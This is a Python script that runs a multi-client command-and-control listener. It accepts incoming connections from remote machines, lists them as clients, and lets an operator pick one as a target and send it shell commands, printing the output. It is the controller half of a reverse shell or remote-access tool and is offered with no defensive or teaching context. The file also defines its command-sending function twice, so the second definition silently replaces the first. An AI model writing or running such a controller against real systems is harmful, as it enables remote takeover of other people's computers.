#!/usr/bin/env python
import signal
import socket
import sys
import threading
from queue import Queue

NUM_THREADS = 2
JOB = [1, 2]
queue = Queue()
all_conn = []
all_addrs = []


def prompt():
    while True:
        cmd = input('> ')
        if cmd == "list":
            list_conn()
            continue
        elif "select" in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_cmd(conn)
        else:
            print("Available commands:\n-list\n-select <n>")
            continue

def list_conn():
    res = ''
    for i, c in enumerate(all_conn):
        try:
            c.send(str.encode(' '))
            c.recv(1024)
        except:
            del all_conn[i]
            del all_addrs[i]
            continue
        res += str(i) + '\t' + str(all_addrs[i][0]) + ":" + str(all_addrs[i][1]) + '\n'
    print("=====Clients=====" + '\n' + res)

def get_target(cmd):
    target = int(cmd.split(' ')[-1])
    try:
        conn = all_conn[target]
        print('Connected to  -> ' + str(all_addrs[target][0]))
        print(str(all_addrs[target][0]) + ' > ', end='')
        return conn
    except:
        print('Not a valid target')
        return None

def send_cmd(conn):
    """
    THREAD #2
    """
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                response = str(conn.recv(4096), 'utf-8')
                print(response, end='')
        except:
            print('Connection lost')
            break

def create_threads():
    signal.signal(signal.SIGINT, sig_quit)
    signal.signal(signal.SIGTERM, sig_quit)

    for _ in range(NUM_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()
    return

def work():
    """
    job #1 - handles connections
    job #2 - sends the commands
    """
    while True:
        x = queue.get()
        if x == 1:
            sock_create()
            sock_bind()
            multi_accept()
        if x == 2:
            prompt()
        queue.task_done()

def create_jobs():
    for x in JOB:
        queue.put(x)
    queue.join()

def multi_accept():
    """
        THREAD #1
    """
    for c in all_conn:
        c.close()

    del all_conn[:]
    del all_addrs[:]
    while True:
        try:
            conn, addr = sock.accept()
            conn.setblocking(1)
        except:
            print("Multi accept error")
            break

        all_conn.append(conn)
        all_addrs.append(addr)
        print("\nConnection has been established -> {}:{}".format(addr[0], addr[1]))

def sig_quit(signal=None, frame=None):
    print('\nQuitting...')
    if sock:
        try:
            sock.shutdown(2)
            sock.close()
        except Exception as e:
            print('Couldn\'t close connection %s' % str(e))
            # continue
    sys.exit(0)
    return


def sock_create():
    try:
        global host
        global port
        global sock

        host = ''
        port = int(sys.argv[1])
        sock = socket.socket()
    except (socket.error, ValueError) as msg:
        print(str(msg))
        sys.exit(1)

def sock_bind():
    try:
        global host
        global port
        global sock

        print("Listening...[{}]".format(port))
        sock.bind((host, port))
        sock.listen(5)
    except (socket.error, OverflowError) as msg:
        print("Failed to bind: " + str(msg))
        sys.exit(1)
        #sock_bind()

def sock_accept():
    conn, addr = sock.accept()
    print("Connection established -> {}:{}".format(addr[0], addr[1]))
    send_cmd(conn)
    conn.close()

def send_cmd(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            sock.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_res = str(conn.recv(4096), 'utf-8')
            print(client_res, end="")


def main():
    if len(sys.argv) < 2:
        print("Usage: ./server.py <port>")
        sys.exit(1)

    signal.signal(signal.SIGINT, sig_quit)
    signal.signal(signal.SIGTERM, sig_quit)

    create_threads()
    create_jobs()

if __name__ == "__main__":
    main()
